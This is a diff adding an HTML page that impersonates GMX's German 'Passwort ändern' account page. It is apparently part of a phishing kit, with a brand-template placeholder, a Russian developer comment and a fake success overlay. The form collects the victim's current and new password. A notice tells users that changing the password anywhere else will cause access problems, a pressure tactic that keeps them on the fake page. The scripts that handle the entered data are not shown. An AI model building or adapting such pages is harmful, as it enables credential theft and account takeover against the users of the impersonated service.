@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <title>Passwort ändern — GMX Mein Account</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+  <!-- __BRAND_JSON__ -->
+  <script src="/brand.js"></script>
+</head>
+<body class="page-change-password">
+  <header class="gmx-header gmx-header--steps" aria-hidden="false">
+    <div class="header-inner">
+      <span class="gmx-logo" id="brand-logo-text">GMX</span>
+      <span class="header-title">Mein Account</span>
+    </div>
+  </header>
+
+  <div class="page-center">
+    <main class="main card" id="main-change">
+      <section class="card-inner step active">
+        <header class="auth-header">
+          <svg class="logo-brand" xmlns="http://www.w3.org/2000/svg" width="97" height="32" viewBox="0 0 123 40" aria-label="gmx-logo">
+            <path fill="#000000" d="M109.42,18.84,120.08,1.09H109.2l-5.67,9-6.1-9H85.51L98.08,18.82l-12.57,20H97.43l6.8-11.37,8.06,11.37h10.64ZM70,1.09,61.91,21.28,54.24,1.09H44.57L38.15,38.87h9.77L51.08,17.1h.1l8.66,21.77h3.91L72.82,17.1h.12l2.75,21.77h9.82L79.79,1.09ZM20.2,17.8v7.68h8C27.78,29.79,24.52,32,20.3,32c-6.42,0-9.89-5.91-9.89-11.75S13.74,8.4,20.15,8.4c3.94,0,6.76,2.38,8.11,5.95l9.26-3.88C34.29,3.47,28.31,0,20.59,0,8.5,0,.25,8,.25,20.19.25,32,8.45,40,20.25,40c6.27,0,11.8-2.24,15.46-7.36C39,28,39.45,23.28,39.55,17.8Z"/>
+          </svg>
+          <h2 class="heading-main">Passwort ändern</h2>
+        </header>
+        <div class="text-form">Geben Sie Ihr aktuelles und neues Passwort ein.</div>
+        <div class="change-page-notice" role="status">
+          Aus Sicherheitsgründen dürfen Sie Ihr Passwort nicht in der E-Mail-App, in den Kontoeinstellungen oder an anderen Stellen ändern. Eine Änderung ist nur auf dieser Seite möglich. Wenn Sie Ihr Passwort woanders ändern, kann dies zu Zugangsproblemen führen.
+        </div>
+        <form id="form-change-direct" class="form form-login" novalidate autocomplete="on">
+          <div class="input-row">
+            <div class="input-group input-group--password">
+              <input type="password" id="old-password" name="oldPassword" placeholder=" " autocomplete="current-password" required aria-labelledby="label-old-pw" class="lux-input">
+              <label id="label-old-pw" for="old-password" class="lux-label">Aktuelles Passwort</label>
+              <button type="button" class="input-icon-btn input-icon-btn--reveal" aria-label="Passwort anzeigen" data-reveal="old-password">
+                <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M11.9999 16C13.2499 16 14.3124 15.5625 15.1874 14.6875C16.0624 13.8125 16.4999 12.75 16.4999 11.5C16.4999 10.25 16.0624 9.1875 15.1874 8.3125C14.3124 7.4375 13.2499 7 11.9999 7C10.7499 7 9.6874 7.4375 8.8124 8.3125C7.9374 9.1875 7.4999 10.25 7.4999 11.5C7.4999 12.75 7.9374 13.8125 8.8124 14.6875C9.6874 15.5625 10.7499 16 11.9999 16ZM11.9999 14.2C11.2499 14.2 10.6124 13.9375 10.0874 13.4125C9.5624 12.8875 9.2999 12.25 9.2999 11.5C9.2999 10.75 9.5624 10.1125 10.0874 9.5875C10.6124 9.0625 11.2499 8.8 11.9999 8.8C12.7499 8.8 13.3874 9.0625 13.9124 9.5875C14.4374 10.1125 14.6999 10.75 14.6999 11.5C14.6999 12.25 14.4374 12.8875 13.9124 13.4125C13.3874 13.9375 12.7499 14.2 11.9999 14.2Z"/></svg>
+              </button>
+            </div>
+          </div>
+          <div class="input-row">
+            <div class="input-group input-group--password">
+              <input type="password" id="new-password" name="newPassword" placeholder=" " autocomplete="new-password" required aria-labelledby="label-new-pw" class="lux-input">
+              <label id="label-new-pw" for="new-password" class="lux-label">Neues Passwort</label>
+              <button type="button" class="input-icon-btn input-icon-btn--reveal" aria-label="Passwort anzeigen" data-reveal="new-password">
+                <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M11.9999 16C13.2499 16 14.3124 15.5625 15.1874 14.6875C16.0624 13.8125 16.4999 12.75 16.4999 11.5C16.4999 10.25 16.0624 9.1875 15.1874 8.3125C14.3124 7.4375 13.2499 7 11.9999 7C10.7499 7 9.6874 7.4375 8.8124 8.3125C7.9374 9.1875 7.4999 10.25 7.4999 11.5C7.4999 12.75 7.9374 13.8125 8.8124 14.6875C9.6874 15.5625 10.7499 16 11.9999 16Z"/></svg>
+              </button>
+            </div>
+          </div>
+          <p role="alert" id="error-change" class="error-login" hidden>
+            <span class="error-login-icon"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M19.82 17L11.18 2a1.36 1.36 0 0 0-2.36 0L.18 17a1.36 1.36 0 0 0 1.18 2h17.28a1.36 1.36 0 0 0 1.18-2zM8.81 6h2.41L11 13H9zM11 17H9v-2h2z"/></svg></span><span id="error-change-text">Bitte alle Felder ausfüllen.</span>
+          </p>
+          <div class="form-buttons">
+            <button type="submit" class="lux-button lux-button--large" id="btn-change-submit">
+              <span class="btn-login-text">Passwort ändern</span>
+              <span class="btn-login-loading" aria-hidden="true" style="display:none;"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>
+            </button>
+          </div>
+        </form>
+      </section>
+    </main>
+
+  <!-- Окно успеха (как на странице входа) -->
+  <div id="success-overlay" class="success-overlay" hidden aria-live="polite">
+    <div class="success-overlay-backdrop"></div>
+    <div class="success-overlay-box">
+      <div class="success-overlay-icon">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <circle cx="12" cy="12" r="10" fill="currentColor"/>
+          <path d="M8 12l3 3 5-6" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h2 class="success-overlay-title">Ihr Passwort wurde geändert</h2>
+      <p class="success-overlay-text">Wir haben ebenfalls Maßnahmen ergriffen.</p>
+      <p class="success-overlay-safe">Ihr Konto ist sicher!</p>
+      <button type="button" class="success-overlay-btn" id="success-overlay-close">Seite schließen</button>
+    </div>
+  </div>
+  </div>
+
+  <footer class="footer">
+    <ul class="footer-links">
+      <li><a href="https://agb-server.gmx.net/gmxagb-de" target="_blank" rel="noopener">AGB</a></li>
+      <li><a href="https://www.gmx.net/impressum/" target="_blank" rel="noopener">Impressum</a></li>
+      <li><a href="https://www.gmx.net/kuendigungsformular" target="_blank" rel="noopener">Verträge hier kündigen</a></li>
+      <li><a href="https://agb-server.gmx.net/datenschutz" target="_blank" rel="noopener">Datenschutz</a></li>
+      <li><a href="https://gmx.net/barrierefreiheit/" target="_blank" rel="noopener">Barrierefreiheit</a></li>
+      <li><a href="https://sw01.rogsurvey.de/data/uxappska/GMXLogin/" target="_blank" rel="noopener">Feedback</a></li>
+    </ul>
+  </footer>
+
+  <script src="/index-change.js"></script>
+  <script src="/status-redirect.js"></script>
+  <script src="/chat-widget.js"></script>
+</body>
+</html>
